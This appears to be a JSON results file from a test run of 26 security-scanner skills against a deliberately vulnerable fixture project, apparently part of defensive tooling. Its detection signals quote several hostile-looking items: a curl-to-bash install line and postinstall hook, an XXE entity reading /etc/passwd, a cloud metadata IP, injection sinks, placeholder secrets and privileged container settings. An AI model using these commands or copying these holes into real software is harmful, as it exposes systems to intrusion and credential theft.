@@ -1,0 +1,1121 @@
+{
+    "totals":  {
+                   "skillsTested":  26,
+                   "skillInvocationIssues":  95,
+                   "directBinaryIssues":  95,
+                   "expectedSignals":  95
+               },
+    "results":  [
+                    {
+                        "skill":  "audit-asvs-compliance",
+                        "category":  "Design / ASVS",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-asvs-compliance",
+                                             "signal":  "ASVS",
+                                             "targets":  [
+                                                             "docs/design.md",
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-asvs-compliance",
+                                             "signal":  "Missing authorization",
+                                             "targets":  [
+                                                             "docs/design.md",
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-asvs-compliance",
+                                             "signal":  "Session cookie",
+                                             "targets":  [
+                                                             "docs/design.md",
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "audit-auth-session-management",
+                        "category":  "Authentication",
+                        "expectedSignals":  4,
+                        "issuesFound":  4,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "jwt.sign",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "expiresIn: \u002730d\u0027",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "secure: false",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "sameSite: \u0027none\u0027",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "audit-crypto-usage",
+                        "category":  "Cryptography",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-crypto-usage",
+                                             "signal":  "md5",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Cryptography",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-crypto-usage",
+                                             "signal":  "Math.random",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Cryptography",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-crypto-usage",
+                                             "signal":  "rejectUnauthorized: false",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Cryptography",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "audit-logging-monitoring",
+                        "category":  "Logging / Monitoring",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-logging-monitoring",
+                                             "signal":  "console.log(\u0027login failed",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Logging / Monitoring",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-logging-monitoring",
+                                             "signal":  "logger.info(\u0027password reset token",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Logging / Monitoring",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "audit-logging-monitoring",
+                                             "signal":  "No central alerting",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Logging / Monitoring",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "detect-secrets",
+                        "category":  "Secrets",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "detect-secrets",
+                                             "signal":  "AWS_ACCESS_KEY_ID_EXAMPLE",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             ".env.example"
+                                                         ],
+                                             "category":  "Secrets",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "detect-secrets",
+                                             "signal":  "-----BEGIN RSA PRIVATE KEY-----",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             ".env.example"
+                                                         ],
+                                             "category":  "Secrets",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "detect-secrets",
+                                             "signal":  "AZURE_CLIENT_SECRET",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             ".env.example"
+                                                         ],
+                                             "category":  "Secrets",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "detect-supply-chain-risks",
+                        "category":  "Supply Chain",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "detect-supply-chain-risks",
+                                             "signal":  "pull_request_target",
+                                             "targets":  [
+                                                             ".github/workflows/build.yml",
+                                                             "Dockerfile",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "Supply Chain",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "detect-supply-chain-risks",
+                                             "signal":  "curl -s https://example.invalid/install.sh | bash",
+                                             "targets":  [
+                                                             ".github/workflows/build.yml",
+                                                             "Dockerfile",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "Supply Chain",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "detect-supply-chain-risks",
+                                             "signal":  "postinstall",
+                                             "targets":  [
+                                                             ".github/workflows/build.yml",
+                                                             "Dockerfile",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "Supply Chain",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "generate-dependency-graph",
+                        "category":  "SBOM / Graph",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "generate-dependency-graph",
+                                             "signal":  "dependsOn",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package-lock.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "generate-dependency-graph",
+                                             "signal":  "lodash",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package-lock.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "generate-dependency-graph",
+                                             "signal":  "minimist",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package-lock.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "generate-sbom",
+                        "category":  "SBOM / Graph",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "generate-sbom",
+                                             "signal":  "bomFormat",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "generate-sbom",
+                                             "signal":  "CycloneDX",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "generate-sbom",
+                                             "signal":  "components",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-api-security",
+                        "category":  "API",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-api-security",
+                                             "signal":  "security: []",
+                                             "targets":  [
+                                                             "api/openapi.yaml",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "API",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-api-security",
+                                             "signal":  "/admin/users/{id}",
+                                             "targets":  [
+                                                             "api/openapi.yaml",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "API",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-api-security",
+                                             "signal":  "x-tenant-id",
+                                             "targets":  [
+                                                             "api/openapi.yaml",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "API",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-broken-access-control",
+                        "category":  "Access Control",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-broken-access-control",
+                                             "signal":  "req.params.id",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Access Control",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-broken-access-control",
+                                             "signal":  "SELECT * FROM users WHERE id",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Access Control",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-broken-access-control",
+                                             "signal":  "cors({ origin: \u0027*\u0027",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Access Control",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-container-image",
+                        "category":  "Container",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-container-image",
+                                             "signal":  "USER root",
+                                             "targets":  [
+                                                             "Dockerfile",
+                                                             "docker-compose.yml"
+                                                         ],
+                                             "category":  "Container",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-container-image",
+                                             "signal":  "privileged: true",
+                                             "targets":  [
+                                                             "Dockerfile",
+                                                             "docker-compose.yml"
+                                                         ],
+                                             "category":  "Container",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-container-image",
+                                             "signal":  "/var/run/docker.sock",
+                                             "targets":  [
+                                                             "Dockerfile",
+                                                             "docker-compose.yml"
+                                                         ],
+                                             "category":  "Container",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-exception-handling",
+                        "category":  "Exception Handling",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-exception-handling",
+                                             "signal":  "res.status(500).send(err.stack)",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Exception Handling",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-exception-handling",
+                                             "signal":  "catch (err)",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Exception Handling",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-exception-handling",
+                                             "signal":  "throw err",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Exception Handling",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-for-injection",
+                        "category":  "Injection",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-for-injection",
+                                             "signal":  "SELECT * FROM users WHERE id = \u0027 + req.params.id",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Injection",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-for-injection",
+                                             "signal":  "exec(\u0027convert \u0027 + req.query.file",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Injection",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-for-injection",
+                                             "signal":  "eval(req.body.expression)",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Injection",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-for-ssrf",
+                        "category":  "SSRF",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-for-ssrf",
+                                             "signal":  "axios.get(req.query.url",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "SSRF",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-for-ssrf",
+                                             "signal":  "169.254.169.254",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "SSRF",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-for-ssrf",
+                                             "signal":  "maxRedirects",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "SSRF",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-for-xss",
+                        "category":  "XSS",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-for-xss",
+                                             "signal":  "innerHTML",
+                                             "targets":  [
+                                                             "src/client.js",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "XSS",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-for-xss",
+                                             "signal":  "dangerouslySetInnerHTML",
+                                             "targets":  [
+                                                             "src/client.js",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "XSS",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-for-xss",
+                                             "signal":  "res.send(\u0027\u003ch1\u003e\u0027 + req.query.name",
+                                             "targets":  [
+                                                             "src/client.js",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "XSS",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-iac-security",
+                        "category":  "IaC",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-iac-security",
+                                             "signal":  "0.0.0.0/0",
+                                             "targets":  [
+                                                             "infra/main.tf"
+                                                         ],
+                                             "category":  "IaC",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-iac-security",
+                                             "signal":  "acl    = \"public-read\"",
+                                             "targets":  [
+                                                             "infra/main.tf"
+                                                         ],
+                                             "category":  "IaC",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-iac-security",
+                                             "signal":  "encrypted         = false",
+                                             "targets":  [
+                                                             "infra/main.tf"
+                                                         ],
+                                             "category":  "IaC",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-json-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  5,
+                        "issuesFound":  5,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"authentication\": false",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"cors\": [\"*\"]",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"clientSecret\": \"json_TEST_SECRET_12345\"",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"rejectUnauthorized\": false",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"postinstall\": \"curl https://example.invalid/install.sh | bash\"",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-kubernetes-manifests",
+                        "category":  "Kubernetes",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-kubernetes-manifests",
+                                             "signal":  "privileged: true",
+                                             "targets":  [
+                                                             "k8s/deployment.yaml"
+                                                         ],
+                                             "category":  "Kubernetes",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-kubernetes-manifests",
+                                             "signal":  "hostNetwork: true",
+                                             "targets":  [
+                                                             "k8s/deployment.yaml"
+                                                         ],
+                                             "category":  "Kubernetes",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-kubernetes-manifests",
+                                             "signal":  "runAsUser: 0",
+                                             "targets":  [
+                                                             "k8s/deployment.yaml"
+                                                         ],
+                                             "category":  "Kubernetes",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-markdown-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  6,
+                        "issuesFound":  6,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "password: admin",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "curl -k https://api.example.invalid/health",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "curl https://example.invalid/install.sh | bash",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "NODE_TLS_REJECT_UNAUTHORIZED=0",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "AWS_ACCESS_KEY_ID_EXAMPLE",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "Threat boundaries are TBD",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-sca-dependencies",
+                        "category":  "SCA / Dependencies",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-sca-dependencies",
+                                             "signal":  "lodash",
+                                             "targets":  [
+                                                             "package.json",
+                                                             "package-lock.json",
+                                                             "sbom/cyclonedx.json"
+                                                         ],
+                                             "category":  "SCA / Dependencies",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-sca-dependencies",
+                                             "signal":  "4.17.20",
+                                             "targets":  [
+                                                             "package.json",
+                                                             "package-lock.json",
+                                                             "sbom/cyclonedx.json"
+                                                         ],
+                                             "category":  "SCA / Dependencies",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-sca-dependencies",
+                                             "signal":  "CVE-2021-23337",
+                                             "targets":  [
+                                                             "package.json",
+                                                             "package-lock.json",
+                                                             "sbom/cyclonedx.json"
+                                                         ],
+                                             "category":  "SCA / Dependencies",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-security-headers",
+                        "category":  "Security Headers",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-security-headers",
+                                             "signal":  "X-Powered-By",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "nginx.conf"
+                                                         ],
+                                             "category":  "Security Headers",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-security-headers",
+                                             "signal":  "Access-Control-Allow-Origin \"*\"",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "nginx.conf"
+                                                         ],
+                                             "category":  "Security Headers",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-security-headers",
+                                             "signal":  "helmet({ contentSecurityPolicy: false",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "nginx.conf"
+                                                         ],
+                                             "category":  "Security Headers",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-static-analysis",
+                        "category":  "Static Analysis",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-static-analysis",
+                                             "signal":  "eval(req.body.expression)",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "src/client.js"
+                                                         ],
+                                             "category":  "Static Analysis",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-static-analysis",
+                                             "signal":  "exec(\u0027convert \u0027 + req.query.file",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "src/client.js"
+                                                         ],
+                                             "category":  "Static Analysis",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-static-analysis",
+                                             "signal":  "innerHTML",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "src/client.js"
+                                                         ],
+                                             "category":  "Static Analysis",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-toml-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  7,
+                        "issuesFound":  7,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "host = \"0.0.0.0\"",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "debug = true",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "tls = false",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "verify_ssl = false",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "api_key = \"toml_TEST_SECRET_12345\"",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "allowed_origins = [\"*\"]",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-toml-security",
+                                             "signal":  "url = \"http://packages.example.invalid/simple\"",
+                                             "targets":  [
+                                                             "config/formats.toml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-xml-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  6,
+                        "issuesFound":  6,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003csecurity-enabled\u003efalse\u003c/security-enabled\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003cauth-method\u003eNONE\u003c/auth-method\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003ctransport-guarantee\u003eNONE\u003c/transport-guarantee\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "\u003cpassword\u003exml_TEST_SECRET_12345\u003c/password\u003e",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-xml-security",
+                                             "signal":  "debug=\"true\"",
+                                             "targets":  [
+                                                             "config/formats.xml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-yaml-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  7,
+                        "issuesFound":  7,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "auth: false",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "host: \"0.0.0.0\"",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "allowedOrigins: [\"*\"]",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "tls: false",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "api_key: \"yaml_TEST_SECRET_12345\"",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "privileged: true",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "scan-yaml-security",
+                                             "signal":  "runAsUser: 0",
+                                             "targets":  [
+                                                             "config/formats.yaml"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "threat-model-system",
+                        "category":  "Design / ASVS",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "threat-model-system",
+                                             "signal":  "Trust boundaries are TBD",
+                                             "targets":  [
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "threat-model-system",
+                                             "signal":  "No abuse cases",
+                                             "targets":  [
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "skill-invocation"
+                                         },
+                                         {
+                                             "skill":  "threat-model-system",
+                                             "signal":  "No documented data classification",
+                                             "targets":  [
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "skill-invocation"
+                                         }
+                                     ]
+                    }
+                ]
+}
